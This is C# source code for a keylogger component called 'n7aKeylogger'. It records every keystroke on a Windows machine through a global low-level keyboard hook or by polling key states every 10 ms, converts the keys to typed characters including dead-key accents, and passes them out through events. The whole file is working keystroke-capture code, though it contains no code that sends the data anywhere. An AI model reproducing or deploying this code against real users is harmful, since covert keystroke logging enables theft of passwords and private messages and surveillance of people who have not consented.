/*  
 *  Coded by:
 *  Nick Russler
 *  Ahmet Yueksektepe
 *  Do NOT remove this comment
 *  contact: n7a.projects@gmail.com
 */

using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.Collections;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;

namespace n7aKeylogger
{
    class Keylogger : Component
    {
        #region API-Declarations
        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpKeyState,
           [Out] StringBuilder lpChar, uint uFlags);
        #endregion

        #region Consts
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_KEYUP = 0x101;
        private const int WM_SYSKEYUP = 0x105;
        #endregion

        #region Fields

        private KLG klg;

        private Keylogger_Modes _Mode = Keylogger_Modes.Hooks;

        private bool _Enabled = true;
        #endregion

        #region Events

        public delegate void ValueChangedEventHandler(String value, bool isChar);

        [Description("Occurs when a key is pressed.")]
        public event ValueChangedEventHandler VKCodeAsStringDown;

        [Description("Occurs when a key is released.")]
        public event ValueChangedEventHandler VKCodeAsStringUp;

        public delegate void ValueChangedEventHandler2(int vkcode);

        [Description("Occurs when a key is pressed.")]
        public event ValueChangedEventHandler2 VKCodeDown;

        [Description("Occurs when a key is released.")]
        public event ValueChangedEventHandler2 VKCodeUp;

        #endregion

        #region Properties

        public enum Keylogger_Modes { Hooks = 0, Polling };

        [Description("Gets or sets a value indicating whether the keylogger uses Polling or Hooking.")]
        public Keylogger_Modes Keylogger_Mode
        {
            get
            {
                return _Mode;
            }
            set
            {
                if (value >= 0)
                {
                    _Mode = value;

                    if (klg != null)
                    {
                        klg.Dispose();
                        klg = null;
                    }

                    if (_Enabled)
                        switch ((int)_Mode)
                        {
                            case 0:
                                klg = new KLG_Hooks(this);
                                break;

                            case 1:
                                klg = new KLG_Polling(this);
                                break;

                        }
                }
                else { _Mode = 0; }
            }
        }

        [Description("Gets or sets a value indicating whether the keylogger is active.")]
        public bool Enabled
        {
            get
            {
                return _Enabled;
            }
            set
            {
                _Enabled = value;
                Keylogger_Mode = _Mode;
            }
        }

        #endregion

        #region Intern-Classes

        private abstract class KLG : IDisposable
        {
            public abstract void Dispose();

            public static Keylogger klg;
        }

        private class KLG_Hooks : KLG
        {
            #region Fields
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;
            private const int WM_SYSKEYDOWN = 0x0104;
            private const int WM_KEYUP = 0x101;
            private const int WM_SYSKEYUP = 0x105;

            private static LowLevelKeyboardProc _proc = HookCallback;
            private static IntPtr _hookID = IntPtr.Zero;

            public delegate void KeyUpCallback(String x);

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, ref KBDLLHOOKSTRUCT lParam);
            #endregion

            #region API-Declarations
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook,
                LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
                IntPtr wParam, ref KBDLLHOOKSTRUCT lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
            #endregion

            public KLG_Hooks(Keylogger _klg)
            {
                _hookID = SetHook(_proc);
                klg = _klg;
            }

            public override void Dispose()
            {
                Dispose(true);
                GC.SuppressFinalize(this);
            }

            protected virtual void Dispose(bool disposing)
            {
                if (disposing)
                {
                    // Free other state (managed objects).
                }
                UnhookWindowsHookEx(_hookID);
            }

            ~KLG_Hooks()
            {
                Dispose(false);
            }

            [DllImport("kernel32.dll")]
            public static extern int GetCurrentThreadId();

            private static IntPtr SetHook(LowLevelKeyboardProc proc)
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private struct KBDLLHOOKSTRUCT
            {
                public int vkCode;
                public int scanCode;
                public int flags;
                int time;
                int dwExtraInfo;
            }

            private static IntPtr HookCallback(int nCode, IntPtr wParam, ref KBDLLHOOKSTRUCT lParam)
            {
                if (nCode >= 0)
                {
                    if ((wParam == (IntPtr)WM_KEYDOWN) || (wParam == (IntPtr)WM_SYSKEYDOWN))
                    {
                        klg.OnKeyAction(lParam.vkCode, lParam.scanCode, true);
                    }
                    else if ((wParam == (IntPtr)WM_KEYUP) || (wParam == (IntPtr)WM_SYSKEYUP))
                    {
                        klg.OnKeyAction(lParam.vkCode, lParam.scanCode, false);
                    }
                }

                return CallNextHookEx(_hookID, nCode, wParam, ref lParam);
            }
        }

        private class KLG_Polling : KLG
        {
            #region API-Declarations
            [DllImport("User32.dll")]
            private static extern short GetAsyncKeyState(System.Int32 vKey);

            [DllImport("user32.dll")]
            static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);

            [DllImport("user32.dll")]
            static extern IntPtr GetKeyboardLayout(uint idThread);

            [DllImport("user32.dll")]
            static extern short GetKeyState(int nVirtKey);
            #endregion

            #region Fields
            System.Windows.Forms.Timer timerKeyMine;
            bool[] a = new bool[256];
            private int KEY_PRESSED = 0x8000;
            #endregion

            public KLG_Polling(Keylogger _klg)
            {
                for (int i = 0; i < a.Length; i++)
                    a[i] = false;

                klg = _klg;

                this.timerKeyMine = new Timer();
                this.timerKeyMine.Interval = 10;
                this.timerKeyMine.Tick += new System.EventHandler(this.timerKeyMine_Tick);
                this.timerKeyMine.Enabled = true;
            }

            private void timerKeyMine_Tick(object sender, EventArgs e)
            {
                // From 8 because we don't need the Mouse Events: http://msdn.microsoft.com/en-us/library/dd375731(v=VS.85).aspx
                for (System.Int32 i = 8; i < 256; i++)
                {
                    bool keyDown = GetAsyncKeyState(i) == -32767;
                    if (keyDown || (((bool)a[i]) && !Convert.ToBoolean(GetKeyState(i) & KEY_PRESSED)))
                    {
                        IntPtr hklLayout = GetKeyboardLayout(0);
                        uint nScanCode = MapVirtualKeyEx((uint)i, 0, hklLayout);

                        klg.OnKeyAction(i, (int)nScanCode, keyDown);
                        a[i] = keyDown;
                    }
                }
            }

            public override void Dispose()
            {
                Dispose(true);
                GC.SuppressFinalize(this);
            }

            protected virtual void Dispose(bool disposing)
            {
                if (disposing)
                {
                    // Free other state (managed objects).
                }
                this.timerKeyMine.Dispose();
            }

            ~KLG_Polling()
            {
                Dispose(false);
            }
        }

        #endregion

        private static bool IsDeadKey(uint vkCode)
        {
            // Checks for Diacritic Characters
            return (MapVirtualKey(vkCode, 2) & 0x80000000) != 0;
        }

        private bool IsPrintableKey(uint vkCode)
        {
            return vkCode >= 0x20;
        }

        private bool isChar(String s)
        {
            return s.ToString().Length == 1;
        }

        // Is Needed for the ToAscii CTRL Bug
        private bool isCTRLPressed()
        {
            return (Control.ModifierKeys == Keys.Control);
        }

        #region GetKeyboardState-Workarround

        // Is needed because GetKeyboardState doesnt work on some Computers

        [DllImport("user32.dll")]
        static extern short GetKeyState(int nVirtKey);

        private byte[] myGetKeyboardState()
        {
            byte[] result = new byte[256];
            for (int i = 0; i < result.Length; i++)
            {
                result[i] = (byte)GetKeyState(i);
            }

            return result;
        }
        #endregion

        #region DeadKey-Workarround Fields
        private bool lastWasDeadKey = false;
        private bool DeadKeyOver = false;
        private ArrayList DeadKeys = new ArrayList();
        #endregion

        private void OnKeyActionFurtherProcessing2(uint vkcode, uint nScanCode, bool isDown, byte[] KBSTATE)
        {
            String result = ((Keys)vkcode).ToString();

            // Another Fix beside the deadkeys workarround, needed because ToAscii doesnt work when STRG is pressed
            if (IsPrintableKey(vkcode) && !isCTRLPressed())
            {
                StringBuilder szKey = new StringBuilder(2);

                byte[] _KBSTATE = KBSTATE;

                uint nConvOld = (uint)ToAscii(vkcode, nScanCode, KBSTATE, szKey, 0);
                DeadKeyOver = false;
                if (nConvOld > 0)
                    result = szKey.ToString().Substring(0, 1);
            }

            if (isDown)
            {
                VKCodeAsStringDown(result, isChar(result));
            }
            else
            {
                VKCodeAsStringUp(result, isChar(result));
            }
        }

        private void OnKeyActionFurtherProcessing1(uint vkcode, uint nScanCode, bool isDown)
        {
            if (IsDeadKey(vkcode))
            {
                lastWasDeadKey = true;
                byte[] oldKBSTATE = new byte[256];
                oldKBSTATE = myGetKeyboardState();
                DeadKeys.Add(new Object[] { vkcode, nScanCode, isDown, oldKBSTATE });
                return;
            }

            if (lastWasDeadKey)
            {
                byte[] oldKBSTATE = new byte[256];
                oldKBSTATE = myGetKeyboardState();
                DeadKeyOver = true;
                lastWasDeadKey = false;
                DeadKeys.Add(new Object[] { vkcode, nScanCode, isDown, oldKBSTATE });
                return;
            }

            if (DeadKeyOver)
            {
                foreach (object obj in DeadKeys)
                {
                    object[] objArray = (object[])obj;

                    OnKeyActionFurtherProcessing2((uint)objArray[0], (uint)objArray[1], (bool)objArray[2], (byte[])objArray[3]);

                    if (IsDeadKey((uint)objArray[0]))
                        ToAscii(vkcode, nScanCode, (byte[])objArray[3], new StringBuilder(2), 0);
                }

                DeadKeys.Clear();
            }

            byte[] KBSTATE = new byte[256];
            KBSTATE = myGetKeyboardState();

            OnKeyActionFurtherProcessing2(vkcode, nScanCode, isDown, KBSTATE);
        }

        private void OnKeyAction(int vkcode, int scancode, bool isDown)
        {
            if ((VKCodeAsStringDown != null) && isDown)
            {
                OnKeyActionFurtherProcessing1((uint)vkcode, (uint)scancode, true);
            }
            else if ((VKCodeAsStringUp != null) && !isDown)
            {
                OnKeyActionFurtherProcessing1((uint)vkcode, (uint)scancode, false);
            }

            if ((VKCodeDown != null) && isDown)
                VKCodeDown(vkcode);
            else if ((VKCodeUp != null) && !isDown)
                VKCodeUp(vkcode);
        }
    }
}
